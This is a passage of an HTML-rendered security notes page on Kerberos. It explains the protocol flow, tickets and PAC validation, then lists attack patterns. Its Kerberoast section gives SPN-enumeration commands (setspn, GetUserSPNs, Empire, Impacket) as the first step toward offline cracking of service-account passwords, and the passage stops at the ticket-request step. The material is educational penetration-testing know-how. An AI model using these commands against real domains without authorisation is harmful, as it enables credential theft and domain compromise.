  <a href="#formats" class="md-nav__link">
    Formats
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attack-patterns" class="md-nav__link">
    Attack Patterns
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#kerberoast" class="md-nav__link">
    Kerberoast
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tips" class="md-nav__link">
    Tips
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-1-service-provider-name-spn-and-spn-discovery" class="md-nav__link">
    Step 1 - Service Provider Name (SPN) and SPN Discovery
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#setspn" class="md-nav__link">
    SetSPN
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getuserspns" class="md-nav__link">
    GetUserSPNs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-ad-recon" class="md-nav__link">
    PowerShell AD Recon
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershellery" class="md-nav__link">
    PowerShellery
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impacket" class="md-nav__link">
    Impacket
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-2-request-service-tickets" class="md-nav__link">
    Step 2 - Request Service Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-3-export-service-tickets" class="md-nav__link">
    Step 3 - Export Service Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-4-crack-service-tickets" class="md-nav__link">
    Step 4 - Crack Service Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-5-rewrite-service-tickets-ram-injection" class="md-nav__link">
    Step 5 - Rewrite Service Tickets &amp; RAM Injection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#defense" class="md-nav__link">
    Defense
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#golden-ticket" class="md-nav__link">
    Golden Ticket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#silver-tickets" class="md-nav__link">
    Silver Tickets
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-service-accounts" class="md-nav__link">
    Find Service Accounts
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#request-spn-ticket" class="md-nav__link">
    Request SPN Ticket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#save-tieket" class="md-nav__link">
    Save Tieket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bruteforce" class="md-nav__link">
    Bruteforce
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smart-card-authentication-with-dh-keys" class="md-nav__link">
    Smart Card Authentication with DH Keys
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-windows-pki" class="md-nav__link">
    Attacking Windows PKI
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-delegation" class="md-nav__link">
    Kerberos Delegation
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#unconstrained-kerberos-delegation" class="md-nav__link">
    Unconstrained Kerberos Delegation
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#identifying-nodes-with-unconstrained-delegation-enabled" class="md-nav__link">
    Identifying Nodes with Unconstrained Delegation Enabled
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attack-pattern" class="md-nav__link">
    Attack Pattern
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#constrained-kerberos-delegation" class="md-nav__link">
    Constrained Kerberos Delegation
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#identifying-users-with-unconstrained-delegation-enabled" class="md-nav__link">
    Identifying Users with Unconstrained Delegation Enabled
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attack-patterns_1" class="md-nav__link">
    Attack Patterns
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacks" class="md-nav__link">
    Attacks
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reference" class="md-nav__link">
    Reference:
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Kerberos</h1>
                
                <h2 id="protocol-summary">Protocol Summary<a class="headerlink" href="#protocol-summary" title="Permanent link">&para;</a></h2>
<ul>
<li>Designed to lessening authentication related packets transmitted in the network  </li>
<li>Not designed for today's network security</li>
<li>Loosing KDC means, security is at total loss </li>
<li>Kerberos uses either <code class="codehilite"><span class="n">UDP</span><span class="o">/</span><span class="mi">88</span></code> or <code class="codehilite"><span class="n">TCP</span><span class="o">/</span><span class="mi">88</span></code> as transport protocol. Hence Kerberos itself is responsible of encrypting data.</li>
<li>Several agents working together:<ul>
<li><code class="codehilite"><span class="n">Client</span></code> or user: who wants to access to the service.</li>
<li><code class="codehilite"><span class="n">AP</span> <span class="p">(</span><span class="n">Application</span> <span class="n">Server</span><span class="p">)</span></code>: offers the service required by the user.</li>
<li><code class="codehilite"><span class="n">KDC</span> <span class="p">(</span><span class="k">Key</span> <span class="n">Distribution</span> <span class="n">Center</span><span class="p">)</span></code>: main service of Kerberos, responsible of issuing the tickets, installed on the DC (Domain Controller). It is supported by the <code class="codehilite"><span class="k">AS</span> <span class="p">(</span><span class="n">Authentication</span> <span class="n">Service</span><span class="p">)</span></code>, which issues the <code class="codehilite"><span class="n">TGTs</span></code>.</li>
</ul>
</li>
<li>Keys:<ul>
<li><code class="codehilite"><span class="n">KDC</span> <span class="k">key</span></code> or <code class="codehilite"><span class="n">krbtgt</span> <span class="k">key</span></code>: Derivate from krbtgt account NTLM hash.</li>
<li><code class="codehilite"><span class="k">User</span> <span class="k">key</span></code>: Derivate from user NTLM hash.</li>
<li><code class="codehilite"><span class="n">Service</span> <span class="k">key</span></code>: Derivate from the NTLM hash of service owner, which can be an user or computer account.</li>
<li><code class="codehilite"><span class="k">Session</span> <span class="k">key</span></code>: Negotiated between the user and KDC.</li>
<li><code class="codehilite"><span class="n">Service</span> <span class="k">session</span> <span class="k">key</span></code>: to be use between user and service.</li>
</ul>
</li>
<li>Tickets:<ul>
<li><code class="codehilite"><span class="n">TGS</span> <span class="p">(</span><span class="n">Ticket</span> <span class="n">Granting</span> <span class="n">Service</span><span class="p">)</span></code>: Ticket which user can use to authenticate against a service. It is encrypted with the service key.</li>
<li><code class="codehilite"><span class="n">TGT</span> <span class="p">(</span><span class="n">Ticket</span> <span class="n">Granting</span> <span class="n">Ticket</span><span class="p">)</span></code>: Ticket presented to the KDC to request for TGSs. It is encrypted with the KDC key.</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">PAC</span> <span class="p">(</span><span class="n">Privilege</span> <span class="n">Attribute</span> <span class="n">Certificate</span><span class="p">)</span></code> is an structure included in almost every ticket.<ul>
<li>It is possible to services to verify the PAC by communicating with the KDC</li>
</ul>
</li>
<li>Messages:<ul>
<li><code class="codehilite"><span class="n">KRB_AS_REQ</span></code>: Used to request the TGT to KDC.</li>
<li><code class="codehilite"><span class="n">KRB_AS_REP</span></code>: Used to deliver the TGT by KDC.</li>
<li><code class="codehilite"><span class="n">KRB_TGS_REQ</span></code>: Used to request the TGS to KDC, using the TGT.</li>
<li><code class="codehilite"><span class="n">KRB_TGS_REP</span></code>: Used to deliver the TGS by KDC.</li>
<li><code class="codehilite"><span class="n">KRB_AP_REQ</span></code>: Used to authenticate a user against a service, using the TGS.</li>
<li><code class="codehilite"><span class="n">KRB_AP_REP</span></code>: (Optional) Used by service to identify itself against the user.</li>
<li><code class="codehilite"><span class="n">KRB_ERROR</span></code>: Message to communicate error conditions.</li>
<li><code class="codehilite"><span class="n">KERB_VERIFY_PAC_REQUEST</span></code>: AP send message to KDC including the signature of PAC, and verify if it is correct. (not part of Kerberos, but NRPC)</li>
</ul>
</li>
</ul>
<h2 id="protocol-flow">Protocol Flow<a class="headerlink" href="#protocol-flow" title="Permanent link">&para;</a></h2>
<p><img alt="Kerberos" src="https://lh5.googleusercontent.com/UeGIGlYK5NvC4FIRPCzOgdeL_UeDjrvszzw2ZbJgitgE_Mdbi1Z6HZSG9VHfBJSDwP2W4ifN9JkpSa9jx-BA=w1360-h611-rw" /></p>
<blockquote>
<p>Ref:  <a href="https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png">https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png</a></p>
</blockquote>
<p><img alt="" src="../../os/windows/_assets/Kerberos-Graphics-1-v2-1260x1265.jpg" /></p>
<blockquote>
<p>Source: <a href="https://www.varonis.com/blog/kerberos-authentication-explained/">https://www.varonis.com/blog/kerberos-authentication-explained/</a></p>
<p>Ref: <a href="https://www.youtube.com/watch?v=VpBCJ8vS7T0">https://www.youtube.com/watch?v=VpBCJ8vS7T0</a></p>
</blockquote>
<p><img alt="image-20190603075252442" src="../_assets/image-20190603075252442.png" /></p>
<blockquote>
<p>Ref: <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf</a></p>
</blockquote>
<h3 id="client-kdc-pre-auth-kerberos-5">Client - KDC (Pre-Auth) (Kerberos 5+)<a class="headerlink" href="#client-kdc-pre-auth-kerberos-5" title="Permanent link">&para;</a></h3>
<p><img alt="image-20190603075326610" src="../_assets/image-20190603075326610.png" /></p>
<blockquote>
<p>Ref: <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf</a></p>
</blockquote>
<ul>
<li>Client constructs an authenticator (request for TGT) containing:<ul>
<li>Identify information - unencrypted.</li>
<li>Timestamp - <strong>encrypted using user's password</strong> (hash). User's password (hash) is used as symmetric key. </li>
</ul>
</li>
<li>When a client sends a request (<strong>AS-REQ</strong>) for a ticket to the <strong>Key Distribution Center (KDC)</strong>. <ul>
<li>A timestamp is sent encrypted with user's password hash (also called <strong>user's long term key</strong>).<ul>
<li>[When using SmartCard] <ul>
<li>[non-DH] Timestamp is signed using public-key and public-key is sent to DC</li>
<li>[DH] Timestamp is signed using public-key and public-key and DH parameters are sent to DC</li>
</ul>
</li>
</ul>
</li>
<li>If request can be decrypted with user's password hash,</li>
<li>
<p>And If request's time is within 5 minutes:</p>
<ul>
<li>The KDC creates a <strong>Ticket-Granting Ticket (TGT)</strong> for the client<ul>
<li>Special ticket that permits the client to obtain additional Kerberos tickets within the same Kerberos realm.</li>
<li>Usually good for 10 hours.</li>
<li>Containing: <ul>
<li>client name</li>
<li>IP address</li>
<li>timestamp</li>
<li>validity period - 10 hours max by default</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>
<p>Sends (<strong>AS-REP</strong>) the encrypted <strong>TGT</strong> + <strong>TGS Session Key</strong> back to the client</p>
<ul>
<li>User portion (client can decrypt) - Encrypted with <strong>user's password</strong> (hash), contains:<ul>
<li><strong>TGS Session Key</strong> - Usable to encrypt communication between client and TGS</li>
</ul>
</li>
<li>[When using SmartCard] 
    - [non-DH] Encrypted with public-key
    - [DH] Encrypted with DH info (?) not public-key</li>
</ul>
<ul>
<li>Server portion (client cannot decrypt) - Encrypted with <strong>KDC's secret key</strong> (<strong>Domain key</strong> / <strong>krbtgt account</strong>), contains:<ul>
<li><strong>TGT</strong> - Permits the client to obtain additional tickets (like TGS) which gives permission for specific services. Contains:<ul>
<li>[Microsoft]  <strong>Privilege Attribute Certificate (PAC)</strong> containing:<ul>
<li>Username</li>
<li>User's RID</li>
<li>Group membership</li>
</ul>
</li>
<li>PAC is signed with:<ul>
<li>Target key (for TGT target key is also KDC key)</li>
<li>KDC key</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>If TGS Session Key can be decrypted using user's password (hash):<ul>
<li>Client stores <strong>encrypted</strong> TGT and <strong>decrypted (?)</strong> TGS Session Key in <strong>Kerberos Tray</strong> <ul>
<li>Always lives in memory</li>
<li>Never saved into disk</li>
<li>Kerberos Tray can be explored with <code class="codehilite"><span class="n">kerbtray</span></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img alt="image-20190603075723053" src="../_assets/image-20190603075723053.png" /></p>
<p><img alt="image-20190603075846017" src="../_assets/image-20190603075846017.png" /></p>
<blockquote>
<p>Ref: <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf</a></p>
</blockquote>
<h3 id="client-service-authentication">Client - Service Authentication<a class="headerlink" href="#client-service-authentication" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>TGS - Ticket granting service</strong> is a KDC component that issues a service ticket when a client requests connection to a Kerberos service.</li>
<li>Client sends following to TGS (<strong>TGS-REQ</strong>)<ul>
<li>Copy of <strong>TGT</strong><ul>
<li>TGS can decrypt this using KDC's secret key</li>
</ul>
</li>
<li>Name of the service</li>
<li>Time stamped client ID encrypted with <strong>TGS Session Key</strong><ul>
<li>TGS can decrypt this using user's password (hash)</li>
</ul>
</li>
</ul>
</li>
<li>TGS will return (<strong>TGS-REP</strong>):<ul>
<li>User Portion (User can decrypt) - Encrypted with <strong>TGS Session Key</strong><ul>
<li><strong>Service Session Key</strong></li>
<li>Validity time</li>
</ul>
</li>
<li>Server Portion / Service Ticket (User cannot decrypt) - Encrypted with <strong>service secret key</strong><ul>
<li><strong>Privilege Attribute Certificate (PAC)</strong></li>
<li>2 HMAC signatures:<ul>
<li>Target key - Service account's hash (might be crackable)</li>
<li>KDC Key - Krbtgt account's hash (not easily crackable)</li>
</ul>
</li>
</ul>
</li>
<li><strong>Service Session Key</strong><ul>
<li>User details</li>
</ul>
</li>
<li>TGS will not do a permission validation. <ul>
<li>If user has a valid TGT that is all it takes to obtain a TGS. </li>
<li>Validating if the user has access to the service is up to the service.</li>
</ul>
</li>
</ul>
</li>
<li>Service Session Key and Service Ticket is stored in <strong>Kerberos Tray</strong> (?)</li>
<li>Client send the following to service when necessary:<ul>
<li>Encrypted <strong>Service Ticket</strong></li>
<li>Time stamped authenticator encrypted with the <strong>Service Session Key</strong></li>
</ul>
</li>
<li>Service will:<ul>
<li>Decrypt the <strong>Service Ticket</strong> with its secret and validate both HMAC</li>
<li>Validate timestamped authenticator.</li>
<li>If both are fine, decrypted <strong>Service Ticket</strong> and check <strong>Privilege Attribute Certificate (PAC)</strong> to decide if access should be granted. </li>
<li>2 HMAC signatures during <strong>PAC Validation</strong>:<ul>
<li>Target key - Service account's hash (might be crackable)<ul>
<li>Always verified</li>
</ul>
</li>
<li>KDC key - Krbtgt account's hash (not easily crackable)<ul>
<li>Verified with KDC "sometimes" (since data should be sent to KDC for verification)</li>
<li>Windows send PAC Validation message to <strong>NetLogin service</strong> of DC if:<ul>
<li>TCB (act as part of the OS) privilege is not there and it is not a <strong>Service Control Manager (SCM)</strong> account. </li>
<li>:. generally if application is running as a service in local system, hash is not checked:<ul>
<li>SQL Server, Exchange server: Generally does not check</li>
<li>App pools in web servers: Always check </li>
</ul>
</li>
<li>Can be asked to check always using regkey "ValidateKdcPacSignature"</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Service may:<ul>
<li>Send a response with timestamp encrypted with the Service Session Key</li>
<li>Client decrypt and verify to prevent MitM</li>
</ul>
</li>
</ul>
<h3 id="inter-forest-authentication">Inter-forest Authentication<a class="headerlink" href="#inter-forest-authentication" title="Permanent link">&para;</a></h3>
<ul>
<li>Instead of encrypting with Domain1’s <strong>krbtgt</strong> account, a ticket is encrypted/signed with the inter-realm trust key that the domains previously exchanged, which is called as an “<strong>Inter-realm ticket-granting-ticket/TGT.</strong>” </li>
<li>Then Domain2 verifies the TGT included in the referral, decrypts it with the previously negotiated inter-realm trust key and proceeds further. An inter-realm TGT can be forged. </li>
</ul>
<h3 id="services-microsoft-implementation">Services (Microsoft Implementation)<a class="headerlink" href="#services-microsoft-implementation" title="Permanent link">&para;</a></h3>
<ul>
<li>When a domain account is configured to run a service (ex: MS SQL) in the environment, a <strong>Service Principal Name (SPN)</strong> is used in the domain to <strong>associate the service with a login account</strong>.</li>
</ul>
<h3 id="krbtgt-password">krbtgt password<a class="headerlink" href="#krbtgt-password" title="Permanent link">&para;</a></h3>
<ul>
<li>Changes with domain functional level update (ex: NT5 -&gt; NT6)</li>
<li>Recovery from restore media </li>
<li>Manually changed (compromise recovery)</li>
</ul>
<h3 id="formats">Formats<a class="headerlink" href="#formats" title="Permanent link">&para;</a></h3>
<ul>
<li>Encoded in ASN.1</li>
<li>Kerberos Tickets are in KRB-CRED format: RFC4120</li>
<li>Microsoft Specific PAC format: cc237917</li>
</ul>
<h2 id="attack-patterns">Attack Patterns<a class="headerlink" href="#attack-patterns" title="Permanent link">&para;</a></h2>
<ul>
<li>Kerberos brute-force</li>
<li>ASREPRoast</li>
<li>Kerberoasting</li>
<li>Pass the key</li>
<li>Pass the ticket</li>
<li>Silver ticket</li>
<li>Golden ticket</li>
</ul>
<h3 id="kerberoast">Kerberoast<a class="headerlink" href="#kerberoast" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Ref: <a href="https://pentestlab.blog/2018/06/12/kerberoast/">https://pentestlab.blog/2018/06/12/kerberoast/</a></p>
</blockquote>
<p>The process of cracking <strong>Kerberos service tickets</strong> and <strong>rewriting</strong> them in order to gain access to the targeted service.</p>
<ul>
<li>Doesn’t require any interaction with the service</li>
<li>as legitimate active directory access can be used to request and export the service ticket</li>
<li>which can be <strong>cracked offline</strong> in order to <strong>retrieve the plain-text password</strong> of the service</li>
<li>because <strong>service tickets are encrypted with the hash (NTLM) of the service account</strong></li>
<li>so any domain user can dump hashes from services without the need to get a shell into the system that is running the service.</li>
<li>Any domain user has the rights by default on a standard domain to:<ul>
<li>To request a Service Ticket for any service.<ul>
<li>Permission checks are done later at the service. </li>
</ul>
</li>
<li>Request a copy of the service accounts. </li>
<li>Request correlating password hash relevant to service accounts (?)</li>
</ul>
</li>
</ul>
<p>Crackable and important tickets can be identified by considering:</p>
<ul>
<li>SPNs bind to domain user accounts</li>
<li>Password last set</li>
<li>Password expiration</li>
<li>Last logon</li>
</ul>
<h4 id="tips">Tips<a class="headerlink" href="#tips" title="Permanent link">&para;</a></h4>
<ul>
<li>Look for SQL Server instances with domain admin used as the service account<ul>
<li>This is not recommended </li>
<li>Instead, each service should use separate user accounts </li>
</ul>
</li>
<li>SMB by default use a computer account</li>
<li>Exchange server defaults to user account</li>
</ul>
<h4 id="step-1-service-provider-name-spn-and-spn-discovery">Step 1 - Service Provider Name (SPN) and SPN Discovery<a class="headerlink" href="#step-1-service-provider-name-spn-and-spn-discovery" title="Permanent link">&para;</a></h4>
<ul>
<li>Format: <code class="codehilite"><span class="n">ServiceType</span><span class="o">/</span><span class="k">Host</span><span class="o">[</span><span class="n">:Port</span><span class="o">][</span><span class="n">/DistinguishedName</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">ServiceAccountName</span><span class="o">]</span><span class="w"></span></code></li>
<li>Users system doesn't know the account running the service<ul>
<li>But KDC needs this info, so that Service Ticket can be encrypted using that account's hash</li>
</ul>
</li>
<li>SPN is the name by which <ul>
<li>a Kerberos client uniquely identifies an instance of a service </li>
<li>for a given Kerberos target computer</li>
<li><strong>KDC has a mapping between ["Service" to "Account"]</strong></li>
</ul>
</li>
<li>A given service instance can have multiple SPNs <ul>
<li>if there are multiple names that clients might use for authentication.</li>
</ul>
</li>
<li>SPN always includes the name of the host computer <ul>
<li>A SPN is registered for each host alias</li>
</ul>
</li>
<li>Point users to the appropriate resource for connection</li>
<li>Discovery via LDAP queries</li>
<li>Help in identify hosts that are running important services</li>
<li>Look for services associated with "User" accounts (can be easier to crack, compared to "Computer" accounts) - GetUserSPNs</li>
<li>List of SPNs: <a href="https://adsecurity.org/?page_id=183">https://adsecurity.org/?page_id=183</a></li>
</ul>
<h5 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h5>
<ul>
<li><a href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx?ranMID=24542&amp;ranEAID=TnL5HPStwNw&amp;ranSiteID=TnL5HPStwNw-EnSz6HaQXe8QIAFjmwLBEw&amp;epi=TnL5HPStwNw-EnSz6HaQXe8QIAFjmwLBEw&amp;irgwc=1&amp;OCID=AID681541_aff_7593_1243925&amp;tduid=(ir__ihutgwoxfckfryf0kk0sohzz0m2xmdzxvj1t9qcw00)(7593)(1243925)(TnL5HPStwNw-EnSz6HaQXe8QIAFjmwLBEw)()&amp;irclickid=_ihutgwoxfckfryf0kk0sohzz0m2xmdzxvj1t9qcw00">Microsoft - Service Principal Names (SPN): SetSPN Syntax</a></li>
</ul>
<h5 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h5>
<h6 id="setspn">SetSPN<a class="headerlink" href="#setspn" title="Permanent link">&para;</a></h6>
<p>Can, view, edit, and delete SPN registrations.</p>
<ul>
<li>Register<ul>
<li><code class="codehilite"><span class="n">setspn</span> <span class="o">-</span><span class="n">s</span> <span class="n">ServiceClass</span><span class="o">/</span><span class="k">Host</span><span class="p">:</span><span class="n">Port</span> <span class="n">AccountName</span></code></li>
<li><code class="codehilite"><span class="n">setspn</span> <span class="o">-</span><span class="n">s</span> <span class="n">FIMService</span><span class="o">/</span><span class="n">FIMSVR</span><span class="p">.</span><span class="n">contoso</span><span class="p">.</span><span class="n">com</span> <span class="n">CONTOSO</span><span class="err">\</span><span class="n">FIMService</span></code> (-s verify that there are no duplicates)</li>
<li><code class="codehilite"><span class="n">setspn</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="o">/</span><span class="n">CES1</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">contoso</span><span class="p">.</span><span class="n">com</span> <span class="n">CORP</span><span class="err">\</span><span class="n">CES</span></code></li>
</ul>
</li>
<li>View all the mappings:<ul>
<li><code class="codehilite"><span class="n">setspn</span> <span class="o">-</span><span class="n">L</span> <span class="n">hostname</span></code> (?)</li>
<li><code class="codehilite"><span class="n">setspn</span> <span class="o">-</span><span class="n">T</span> <span class="n">pentestlab</span> <span class="o">-</span><span class="n">Q</span> <span class="o">*</span><span class="cm">/*</span></code></li>
</ul>
</li>
<li>Delete: <code class="codehilite"><span class="n">setspn</span> <span class="o">-</span><span class="n">d</span> <span class="n">ServiceClass</span><span class="o">/</span><span class="k">Host</span><span class="p">:</span><span class="n">Port</span> <span class="n">AccountName</span></code></li>
<li>Reset SPN registrations for account: <code class="codehilite"><span class="n">setspn</span> <span class="o">-</span><span class="n">r</span> <span class="n">AccountName</span></code></li>
<li>Re-register all SPNs for a given host: <code class="codehilite"><span class="n">setspn</span> <span class="o">-</span><span class="n">R</span> <span class="n">hostname</span></code></li>
<li>Discover missing SPNs: <code class="codehilite"><span class="n">DCDIAG</span> <span class="o">/</span><span class="n">s</span><span class="p">:</span><span class="n">ServerName</span> <span class="o">/</span><span class="k">c</span> <span class="o">/</span><span class="n">v</span></code></li>
<li>Write back computer account's AD replication SPN: <code class="codehilite"><span class="n">DCDIAG</span> <span class="o">/</span><span class="n">fix</span></code></li>
<li>Restart NTDS: <code class="codehilite"><span class="n">net</span> <span class="n">stop</span> <span class="n">ntds</span> <span class="o">&amp;&amp;</span> <span class="n">net</span> <span class="k">start</span> <span class="n">ntds</span></code></li>
<li>Check DC security errors (duplicate SPNs, etc): <code class="codehilite"><span class="n">DCDIAG</span> <span class="o">/</span><span class="n">test</span><span class="p">:</span><span class="n">checksecurityerror</span></code></li>
</ul>
<h6 id="getuserspns">GetUserSPNs<a class="headerlink" href="#getuserspns" title="Permanent link">&para;</a></h6>
<ul>
<li>Query the active directory to discover only services that are <strong>associated with a user account</strong> </li>
<li>Part of: <a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></li>
<li><code class="codehilite"><span class="n">powershell_import</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">ps1</span></code></li>
<li><code class="codehilite"><span class="n">cscript</span><span class="p">.</span><span class="n">exe</span> <span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">vbs</span></code></li>
</ul>
<h6 id="powershell-ad-recon">PowerShell AD Recon<a class="headerlink" href="#powershell-ad-recon" title="Permanent link">&para;</a></h6>
<ul>
<li>Part of: <a href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a></li>
</ul>
<ul>
<li>Query the Active Directory for interesting services such as Exchange, Microsoft SQL, Terminal etc</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">powershell_import</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Discover</span><span class="o">-</span><span class="n">PSMSSQLServers</span><span class="o">.</span><span class="n">ps1</span>
<span class="n">powershell_execute</span> <span class="n">Discover</span><span class="o">-</span><span class="n">PSMSSQLServers</span>

<span class="n">powershell_import</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Discover</span><span class="o">-</span><span class="n">PSMSExchangeServers</span><span class="o">.</span><span class="n">ps1</span>
<span class="n">powershell_execute</span> <span class="n">Discover</span><span class="o">-</span><span class="n">PSMSExchangeServers</span>
</pre></div>

<ul>
<li>Find service accounts:</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">powershell_import</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Find</span><span class="o">-</span><span class="n">PSServiceAccounts</span><span class="o">.</span><span class="n">ps1</span>
<span class="n">powershell_execute</span> <span class="n">Find</span><span class="o">-</span><span class="n">PSServiceAccounts</span>
</pre></div>

<p>###### Empire</p>
<div class="codehilite"><pre><span></span><span class="n">usemodule</span> <span class="n">situational_awareness</span><span class="o">/</span><span class="n">network</span><span class="o">/</span><span class="n">get_spn</span>
</pre></div>

<h6 id="powershellery">PowerShellery<a class="headerlink" href="#powershellery" title="Permanent link">&para;</a></h6>
<ul>
<li>Part of: <a href="https://github.com/nullbind/Powershellery">https://github.com/nullbind/Powershellery</a></li>
</ul>
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">SPN</span> <span class="o">-</span><span class="k">type</span> <span class="n">service</span> <span class="o">-</span><span class="k">search</span> <span class="ss">&quot;*&quot;</span> <span class="o">-</span><span class="n">List</span> <span class="n">yes</span> <span class="o">|</span> <span class="n">Format</span><span class="o">-</span><span class="k">Table</span>
<span class="k">Get</span><span class="o">-</span><span class="n">SPN</span> <span class="o">-</span><span class="k">type</span> <span class="n">service</span> <span class="o">-</span><span class="k">search</span> <span class="ss">&quot;*&quot;</span>
</pre></div>

<p>Get UserSID, the service and the actual User.
<div class="codehilite"><pre><span></span><span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="p">.</span><span class="err">\</span><span class="k">Get</span><span class="o">-</span><span class="n">DomainSpn</span><span class="p">.</span><span class="n">psm1</span>
<span class="k">Get</span><span class="o">-</span><span class="n">DomainSpn</span>
</pre></div></p>
<h6 id="impacket">Impacket<a class="headerlink" href="#impacket" title="Permanent link">&para;</a></h6>
<p>Valid domain credentials are required for communication with the Active Directory as token based authentication cannot be used.</p>
<div class="codehilite"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="n">pentestlab</span><span class="p">.</span><span class="k">local</span><span class="o">/</span><span class="n">test</span>
</pre></div>

<h4 id="step-2-request-service-tickets">Step 2 - Request Service Tickets<a class="headerlink" href="#step-2-request-service-tickets" title="Permanent link">&para;</a></h4>
<p>Request is <strong>sent to the KDC</strong>, hence it's not required that service is accessible, available or even exit anymore.</p>
<p>Request the service ticket for a specific SPN:</p>
<div class="codehilite"><pre><span></span><span class="k">Add</span><span class="o">-</span><span class="k">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="k">System</span><span class="p">.</span><span class="n">IdentityModel</span>
